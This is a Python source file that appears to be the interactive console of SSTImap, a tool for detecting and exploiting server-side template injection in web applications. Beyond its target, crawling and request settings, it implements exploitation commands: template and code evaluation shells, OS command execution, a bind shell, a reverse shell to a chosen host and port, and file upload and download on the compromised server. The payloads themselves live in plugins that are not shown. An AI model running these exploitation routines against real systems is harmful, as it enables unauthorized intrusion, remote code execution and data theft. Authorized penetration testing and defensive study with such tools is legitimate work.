import cmd
from utils.crawler import crawl, find_page_forms
from utils.loggers import log
from urllib import parse
from core import checks
from core.channel import Channel
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
from core.tcpclient import TcpClient
import socket


class InteractiveShell(cmd.Cmd):
    """Interactive mode shell."""
    def __init__(self, args):
        cmd.Cmd.__init__(self)
        self.prompt = f"SSTImap> "
        self.sstimap_options = args
        self.sstimap_options.update({"tpl_shell": False, "tpl_cmd": None, "os_shell": False, "os_cmd": None,
                                     "bind_shell": None, "reverse_shell": None, "upload": None, "download": None,
                                     "eval_shell": False, "eval_cmd": None})
        if self.sstimap_options["url"]:
            self.do_url(args.get("url"))
            self.channel = Channel(self.sstimap_options)
        self.current_plugin = None
        self.checked = False

    def set_module(self, module):
        self.prompt = f"SSTImap{f' ({module})' if module else ''}> "

    def default(self, line):
        log.log(22, f'Invalid interactive command: {line.split(" ", 1)[0].lower()}. '
                    f'Type \'help\' to see available commands.')

    def emptyline(self):
        pass

# Information commands

    def do_help(self, line):
        log.log(23, """SSTImap is an automatic SSTI detection and exploitation tool with predetermined and interactive modes.

Information:
  ?, help                                 Show this help message
  version                                 Print SSTImap version
  opt, options                            Display current SSTImap options
  info                                    Show information about detection results

Target:
  url, target [URL]                       Set target URL (e.g. 'https://example.com/?name=test')
  crawl [DEPTH]                           Crawl up to depth (0 - do not crawl)
  forms                                   Search page(s) for forms
  run, test, check                        Run SSTI detection on the target

Request:
  mark, marker [MARKER]                   Set string as injection marker (default '*')
  data, post {rm} [DATA]                  Add POST data param to send (e.g. 'param=value'). To remove by prefix, use "data rm PREFIX". Whithout arguments, shows params list
  header, headers {rm} [HEADER]           Add header to send (e.g. 'Header: Value'). To remove by prefix, use "data rm PREFIX". Whithout arguments, shows headers list
  cookie, cookies {rm} [COOKIE]           Cookie to send (e.g. 'Field=Value'). To remove by prefix, use "data rm PREFIX". Whithout arguments, shows cookies list
  method, http_method [METHOD]            Set HTTP method to use (default 'GET')
  agent, user_agent [AGENT]               Set User-Agent header value to use
  random, random_agent                    Toggle using random User-Agent header value from a list of desktop browsers on every attempt
  proxy [PROXY]                           Use a proxy to connect to the target URL
  ssl, verify_ssl                         Toggle verifying SSL certificates (not verified by default)

Detection:
  lvl, level [LEVEL]                      Set level of escaping to perform (1-5, Default: 1)
  force, force_level [LEVEL] [CLEVEL]     Force a LEVEL and CLEVEL to test
  engine [ENGINE]                         Check only this backend template engine. For all, use '*'
  technique [TECHNIQUE]                   Use techniques R(endered) T(ime-based blind). Default: RT
  legacy                                  Toggle including old payloads, that no longer work with newer versions of the engines
  exclude [PATTERN]                       Regex pattern to exclude from crawler
  domains [DOMAINS]                       Crawl other domains: Y(es) / S(ubdomains) / N(o). Default: S

Exploitation:
  tpl, tpl_shell                          Prompt for an interactive shell on the template engine
  tpl_code [CODE]                         Inject code in the template engine
  eval, eval_shell                        Prompt for an interactive shell on the template engine base language
  eval_code [CODE]                        Evaluate code in the template engine base language
  !, os, shell, os_shell                  Prompt for an interactive operating system shell
  os_cmd [COMMAND]                        Execute an operating system command
  bind, bind_shell [PORT]                 Spawn a system shell on a TCP PORT of the target and connect to it
  reverse, reverse_shell [HOST] [PORT]    Run a system shell and back-connect to local HOST PORT
  overwrite, force_overwrite              Toggle file overwrite when uploading
  up, upload [LOCAL] [REMOTE]             Upload LOCAL to REMOTE files
  down, download [REMOTE] [LOCAL]         Download REMOTE to LOCAL files

SSTImap:
  reload, reload_plugins                  Reload all SSTImap plugins""")

    def do_version(self, line):
        """Show current SSTImap version"""
        log.log(23, f'Current SSTImap version: {self.sstimap_options["version"]}')

    def do_options(self, line):
        """Show current SSTImap options"""
        crawl_domains = {"Y": "Yes", "S": "Subdomains only", "N": "No"}
        log.log(23, f'Current SSTImap {self.sstimap_options["version"]} interactive mode options:')
        if not self.sstimap_options["url"]:
            log.log(25, f'URL is not set.')
        else:
            log.log(26, f'URL: {self.sstimap_options["url"]}')
        log.log(26, f'Injection marker: {self.sstimap_options["marker"]}')
        if self.sstimap_options["data"]:
            data = "\n    ".join(self.sstimap_options["data"])
            log.log(26, f'POST data:\n    {data}')
        if self.sstimap_options["headers"]:
            headers = "\n    ".join(self.sstimap_options["headers"])
            log.log(26, f'HTTP headers:\n    {headers}')
        if self.sstimap_options["cookies"]:
            cookies = "\n    ".join(self.sstimap_options["cookies"])
            log.log(26, f'Cookies:\n    {cookies}')
        log.log(26, f'HTTP method: {self.sstimap_options["method"]}')
        if self.sstimap_options["random_agent"]:
            log.log(26, 'User-Agent is randomised')
        else:
            log.log(26, f'User-Agent: {self.sstimap_options["user_agent"]}')
        if self.sstimap_options["proxy"]:
            log.log(26, f'Proxy: {self.sstimap_options["proxy"]}')
        log.log(26, f'Verify SSL: {self.sstimap_options["verify_ssl"]}')
        if self.sstimap_options["force_level"]:
            log.log(26, f'Forced level: {self.sstimap_options["force_level"][0]}')
            log.log(26, f'Forced context level: {self.sstimap_options["force_level"][1]}')
        else:
            log.log(26, f'Level: {self.sstimap_options["level"]}')
        log.log(26, f'Engine: {self.sstimap_options["engine"] if self.sstimap_options["engine"] else "*"}'
                    f'{"+" if not self.sstimap_options["engine"] and self.sstimap_options["legacy"] else ""}')
        if self.sstimap_options["crawl_depth"] > 0:
            log.log(26, f'Crawler depth: {self.sstimap_options["crawl_depth"]}')
        else:
            log.log(26, 'Crawler depth: no crawl')
        if self.sstimap_options["crawl_exclude"]:
            log.log(26, f'Crawler exclude RE: "{self.sstimap_options["crawl_exclude"]}"')
        log.log(26, f'Crawl other domains: {crawl_domains.get(self.sstimap_options["crawl_exclude"].upper())}')
        log.log(26, f'Form detection: {self.sstimap_options["forms"]}')
        log.log(26, f'Attack technique: {self.sstimap_options["technique"]}')
        log.log(26, f'Force overwrite files: {self.sstimap_options["force_overwrite"]}')

    do_opt = do_options

    def do_info(self, line):
        """Show information about the capabilities of a detected SSTI"""
        if not self.checked:
            log.log(25, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        checks.print_injection_summary(self.channel)

# Target commands

    def do_url(self, line):
        """Set target URL"""
        if line == '':
            log.log(22, 'Target URL cannot be empty.')
            return
        url = parse.urlparse(line)
        if url.netloc == '':
            log.log(22, 'Unable to parse target URL.')
            return
        log.log(24, f'Target URL is set to {line}')
        self.sstimap_options["url"] = line
        self.set_module(f'\033[31m{url.netloc}\033[0m')
        self.checked = False

    do_target = do_url

    def do_crawl(self, line):
        if not line.isnumeric():
            line = "0"
        self.sstimap_options['crawl_depth'] = int(line)
        if int(line):
            log.log(24, f'Crawling depth is set to {line}.')
        else:
            log.log(24, 'Crawling disabled.')
        
    def do_exclude(self, line):
        self.sstimap_options['crawl_exclude'] = line
        if line:
            log.log(24, f'Crawler exclude RE is set to "{line}".')
        else:
            log.log(24, 'Crawler exclude RE disabled.')
    
    do_crawl_exclude = do_exclude
    do_crawlexclude = do_exclude
        
    def do_forms(self, line):
        overwrite = not self.sstimap_options['forms']
        log.log(24, f'Form detection {"en" if overwrite else "dis"}abled.')
        self.sstimap_options['forms'] = overwrite

    def do_run(self, line):
        """Check target URL for SSTI vulnerabilities"""
        if not self.sstimap_options["url"]:
            log.log(22, 'Target URL cannot be empty.')
            return
        try:
            if self.sstimap_options['crawl_depth'] or self.sstimap_options['forms']:
                # crawler mode
                urls = set([self.sstimap_options['url']])
                if self.sstimap_options['crawl_depth']:
                    crawled_urls = set()
                    for url in urls:
                        crawled_urls.update(crawl(url, self.sstimap_options))
                    urls.update(crawled_urls)
                if not self.sstimap_options['forms']:
                    for url in urls:
                        log.log(27, f'Scanning url: {url}')
                        url_options = self.sstimap_options.copy()
                        url_options['url'] = url
                        self.channel = Channel(url_options)
                        self.current_plugin = checks.check_template_injection(self.channel)
                        if self.channel.data.get('engine'):
                            break  # TODO: save vulnerabilities
                else:
                    forms = set()
                    log.log(23, 'Starting form detection...')
                    for url in urls:
                        forms.update(find_page_forms(url, self.sstimap_options))
                    for form in forms:
                        log.log(27, f'Scanning form with url: {form[0]}')
                        url_options = self.sstimap_options.copy()
                        url_options['url'] = form[0]
                        url_options['method'] = form[1]
                        url_options['data'] = parse.parse_qs(form[2], keep_blank_values=True)
                        self.channel = Channel(url_options)
                        self.current_plugin = checks.check_template_injection(self.channel)
                        if self.channel.data.get('engine'):
                            break  # TODO: save vulnerabilities
                    if not forms:
                        log.log(22, f'No forms were detected to scan')
            else:
                # predetermined mode
                self.channel = Channel(self.sstimap_options)
                self.current_plugin = checks.check_template_injection(self.channel)
        except (KeyboardInterrupt, EOFError):
            log.log(26, 'Exiting SSTI detection')
        self.checked = True

    do_check = do_run
    do_test = do_run

# Request commands

    def do_marker(self, line):
        """Set injection marker"""
        if line == '':
            log.log(22, 'Marker can\'t be empty.')
            return
        log.log(24, f'Marker is set to {line}')
        self.sstimap_options["marker"] = line

    do_mark = do_marker

    def do_data(self, line):
        """Modify POST data"""
        if line == "":
            log.log(24, f'Clearing all POST data...')
            self.sstimap_options["data"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing data starting with {command[1]}:')
            for data in self.sstimap_options["data"].copy():
                if data.startswith(command[1]):
                    log.log(26, f'Removing: {data}')
                    self.sstimap_options["data"].remove(data)
        else:
            log.log(24, f'Adding POST data: {line}')
            self.sstimap_options["data"].append(line)

    do_post = do_data

    def do_header(self, line):
        """Modify HTTP headers"""
        if line == "":
            log.log(24, f'Clearing all HTTP headers...')
            self.sstimap_options["headers"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing HTTP headers starting with {command[1]}:')
            for header in self.sstimap_options["headers"].copy():
                if header.startswith(command[1]):
                    log.log(26, f'Removing: {header}')
                    self.sstimap_options["headers"].remove(header)
        else:
            log.log(24, f'Adding HTTP header: {line}')
            self.sstimap_options["headers"].append(line)

    do_headers = do_header

    def do_cookie(self, line):
        """Modify cookies"""
        if line == "":
            log.log(24, f'Clearing all cookies...')
            self.sstimap_options["cookies"] = []
            return
        command = line.split(" ", 1)
        if (command[0] == "remove" or command[0] == "rm") and len(command) == 2 and command[1] != "":
            log.log(24, f'Removing cookies starting with {command[1]}:')
            for cookie in self.sstimap_options["cookies"].copy():
                if cookie.startswith(command[1]):
                    log.log(26, f'Removing: {cookie}')
                    self.sstimap_options["cookies"].remove(cookie)
        else:
            log.log(24, f'Adding cookie: {line}')
            self.sstimap_options["cookies"].append(line)

    do_cookies = do_cookie

    def do_http_method(self, line):
        """Set HTTP method"""
        if line == '':
            log.log(22, 'HTTP method cannot be empty.')
            return
        line = line.upper()
        log.log(24, f'HTTP method is set to {line}')
        self.sstimap_options["method"] = line

    do_method = do_http_method

    def do_user_agent(self, line):
        """Set User-Agent"""
        if line == '':
            log.log(22, 'User-Agent cannot be empty.')
            return
        log.log(24, f'User-Agent is set to {line}')
        self.sstimap_options["user_agent"] = line

    do_agent = do_user_agent

    def do_random_agent(self, line):
        """Switch random_user_agent option"""
        overwrite = not self.sstimap_options["random_agent"]
        log.log(24, f'Value of \'random_user_agent\' is set to {overwrite}')
        self.sstimap_options["random_agent"] = overwrite

    do_random = do_random_agent

    def do_proxy(self, line):
        """Use proxy"""
        if line == "":
            log.log(24, f'Disabling proxy...')
            self.sstimap_options["proxy"] = None
            return
        log.log(24, f'Setting proxy to {line}')
        self.sstimap_options["proxy"] = line

    def do_verify_ssl(self, line):
        """Switch verify_ssl option"""
        overwrite = not self.sstimap_options["verify_ssl"]
        log.log(24, f'Value of \'verify_ssl\' is set to {overwrite}')
        self.sstimap_options["verify_ssl"] = overwrite

    do_ssl = do_verify_ssl

# Detection commands

    def do_level(self, line):
        """Set LEVEL to check for escapes"""
        if line == '' or not line.isnumeric() or len(line) > 1:
            log.log(22, 'Invalid LEVEL value.')
            return
        level = int(line)
        log.log(24, f'Escaping level is set to {level}')
        self.sstimap_options["level"] = level

    do_lvl = do_level

    def do_force_level(self, line):
        """Force LEVEL and CLEVEL to check"""
        if line == "":
            log.log(24, f'Disabling forced template escaping level and language context level')
            self.sstimap_options["force_level"] = None
            return
        line = line.split(" ")
        if len(line) != 2 or not line[0].isnumeric() or len(line[0]) > 1 or not line[1].isnumeric() or len(line[1]) > 1:
            log.log(22, 'Invalid LEVEL or CLEVEL value.')
            return
        force_level = (int(line[0]), int(line[1]),)
        log.log(24, f'Forcing template escaping level {force_level[0]} and language context level {force_level[1]}')
        self.sstimap_options["force_level"] = force_level

    do_force = do_force_level

    def do_engine(self, line):
        """Set template ENGINE to check"""
        if line.lower() in ['', '*', 'all']:
            line = None
        log.log(24, f'Template engine is set to {line if line else "*"}')
        self.sstimap_options["engine"] = line

    def do_technique(self, line):
        """Set attack TECHNIQUE to check"""
        line = line.upper()
        if line not in ["R", "T", "RT", "TR"]:
            log.log(22, 'Invalid TECHNIQUE value. It should be \'R\', \'T\' or \'RT\'.')
            return
        log.log(24, f'Attack technique is set to {line}')
        self.sstimap_options["technique"] = line

    def do_crawl_domains(self, line):
        """Set crawling DOMAINS behaviour"""
        line = line.upper()
        if line not in ["Y", "S", "N"]:
            log.log(22, 'Invalid DOMAINS value. It should be \'Y\', \'S\' or \'N\'.')
            return
        log.log(24, f'Domain crawling is set to {line}')
        self.sstimap_options["crawl_domains"] = line

    do_domains = do_crawl_domains

    def do_legacy(self, line):
        """Switch legacy option"""
        overwrite = not self.sstimap_options["legacy"]
        log.log(24, f'Value of \'legacy\' is set to {overwrite}')
        self.sstimap_options["legacy"] = overwrite

# Exploitation commands

    def do_tpl_shell(self, line):
        """Provide interactive multi-line template shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            log.log(21, 'Inject multi-line template code. Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
                MultilineShell(call, f"{self.channel.data.get('engine', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template shell')
        else:
            log.log(22, 'No code evaluation capabilities have been detected on the target')

    do_tpl = do_tpl_shell

    def do_tpl_code(self, line):
        """Evaluate single template command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'Template command cannot be empty.')
            return
        if self.channel.data.get('engine'):
            if self.channel.data.get('blind'):
                log.log(23, 'Only blind execution has been found. '
                            'Injected template code will not produce any output.')
                call = self.current_plugin.inject
            else:
                call = self.current_plugin.render
            try:
                print(call(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting template command execution')
        else:
            log.log(22, 'No template code evaluation capabilities have been detected on the target')

    def do_eval_shell(self, line):
        """Provide interactive multi-line template base language shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'Injected template code will not produce any output.')
            log.log(21, 'Inject multi-line template base language code. '
                        'Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
                MultilineShell(self.current_plugin.evaluate_blind, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template base language shell')
        elif self.channel.data.get('evaluate'):
            log.log(21, 'Inject multi-line template base language code. '
                        'Press ctrl-D or type \'EOF\' on a new line to send the lines')
            try:
                MultilineShell(self.current_plugin.evaluate, f"{self.channel.data.get('language', '')} > ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting template base language shell')
        else:
            log.log(22, 'No language code evaluation capabilities have been detected on the target')

    do_eval = do_eval_shell

    def do_eval_code(self, line):
        """Evaluate single template command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'Language command cannot be empty.')
            return
        if self.channel.data.get('evaluate_blind'):
            log.log(23, 'Only blind execution has been found. '
                        'Injected code will not produce any output.')
            try:
                print(self.current_plugin.evaluate_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting language command execution')
        elif self.channel.data.get('evaluate'):
            try:
                print(self.current_plugin.evaluate(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting language command execution')
        else:
            log.log(22, 'No code evaluation capabilities have been detected on the target')

    def do_os_shell(self, line):
        """Provide interactive OS shell"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                        'True or False is returned whether it returns successfully or not.')
            log.log(21, 'Run commands on the operating system.')
            try:
                Shell(self.current_plugin.execute_blind, f"{self.channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting OS shell')
        elif self.channel.data.get('execute'):
            log.log(21, 'Run commands on the operating system.')
            try:
                Shell(self.current_plugin.execute, f"{self.channel.data.get('os', 'undetected')} $ ").cmdloop()
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting OS shell')
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')

    do_shell = do_os_shell
    do_os = do_os_shell

    def do_os_cmd(self, line):
        """Execute single OS command"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '':
            log.log(22, 'OS command cannot be empty.')
            return
        if self.channel.data.get('execute_blind'):
            log.log(23, """Blind injection has been found and command execution will not produce any output.""")
            log.log(26, 'Delay is introduced appending \'&& sleep <delay>\' to the shell commands. '
                        'True or False is returned whether it returns successfully or not.')
            try:
                print(self.current_plugin.execute_blind(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting OS command execution')
        elif self.channel.data.get('execute'):
            try:
                print(self.current_plugin.execute(line))
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting OS command execution')
        else:
            log.log(22, 'No system command execution capabilities have been detected on the target.')

    def do_bind_shell(self, line):
        """Create bind shell on PORT"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        if line == '' or not line.isnumeric():
            log.log(22, 'Invalid PORT supplied for bind shell.')
            return
        port = int(line)
        if self.channel.data.get('bind_shell'):
            url = parse.urlparse(self.channel.base_url)
            if not url.hostname:
                log.log(22, "Error parsing hostname")
                return
            for idx, thread in enumerate(self.current_plugin.bind_shell(port)):
                log.log(26, f'Spawn a shell on remote port {port} with payload {idx+1}')
                thread.join(timeout=1)
                if thread.is_alive():
                    log.log(24, f'Shell with payload {idx+1} seems stable')
                    break
            try:
                a = TcpClient(url.hostname, port, timeout=5)
                a.shell()
                return
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting bind shell')
            except Exception as e:
                log.log(25, f"Error connecting to {url.hostname}:{port} {e}")
        else:
            log.log(22, 'No TCP shell opening capabilities have been detected on the target')

    def do_reverse_shell(self, line):
        """Send reverse shell to HOST:PORT"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        dest = line.split(" ")
        if len(dest) != 2 or '' in dest:
            log.log(22, 'You must supply HOST and PORT for a reverse shell.')
            return
        host, port = dest
        if not port.isnumeric():
            log.log(22, 'Invalid PORT supplied for reverse shell.')
            return
        timeout = 15
        if self.channel.data.get('reverse_shell'):
            self.current_plugin.reverse_shell(host, port)
            try:
                TcpServer(int(port), timeout)
            except (KeyboardInterrupt, EOFError):
                print()
                log.log(26, 'Exiting reverse shell')
            except socket.timeout:
                log.log(22, f"No incoming TCP shells after {timeout}s, quitting.")
        else:
            log.log(22, 'No reverse TCP shell capabilities have been detected on the target')

    do_bind = do_bind_shell
    do_reverse = do_reverse_shell

    def do_force_overwrite(self, line):
        """Switch forсe_overwrite option"""
        overwrite = not self.sstimap_options["force_overwrite"]
        log.log(24, f'Value of \'force_overwrite\' is set to {overwrite}')
        self.sstimap_options["force_overwrite"] = overwrite

    do_overwrite = do_force_overwrite

    def do_upload(self, line):
        """Upload LOCAL to REMOTE file"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, 'You must supply LOCAL and REMOTE paths for upload.')
            return
        if self.channel.data.get('write'):
            local_path, remote_path = paths
            try:
                with open(local_path, 'rb') as f:
                    data = f.read()
                self.current_plugin.write(data, remote_path)
            except FileNotFoundError:
                log.log(25, f'Local file not found: {local_path}')
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting file upload')
        else:
            log.log(22, 'No file upload capabilities have been detected on the target')

    def do_download(self, line):
        """Download REMOTE to LOCAL file"""
        if not self.checked:
            log.log(22, 'Target URL was not checked for SSTI. Use \'run\' or \'check\' first.')
            return
        paths = line.split(" ")
        if len(paths) != 2 or '' in paths:
            log.log(22, 'You must supply REMOTE and LOCAL paths for download.')
            return
        if self.channel.data.get('read'):
            remote_path, local_path = paths
            try:
                content = self.current_plugin.read(remote_path)
                with open(local_path, 'wb') as f:
                    f.write(content)
            except (KeyboardInterrupt, EOFError):
                log.log(26, 'Exiting file download')
        else:
            log.log(22, 'No file download capabilities have been detected on the target')

    do_up = do_upload
    do_down = do_download

# SSTImap commands

    def do_reload_modules(self, line):
        """Reload all modules"""
        from core.plugin import unload_plugins
        from sstimap import load_plugins
        unload_plugins()
        load_plugins()
        from core.plugin import loaded_plugins
        log.log(23, f"Reloaded plugins by categories: {'; '.join([f'{x}: {len(loaded_plugins[x])}' for x in loaded_plugins])}")

    do_reload = do_reload_modules
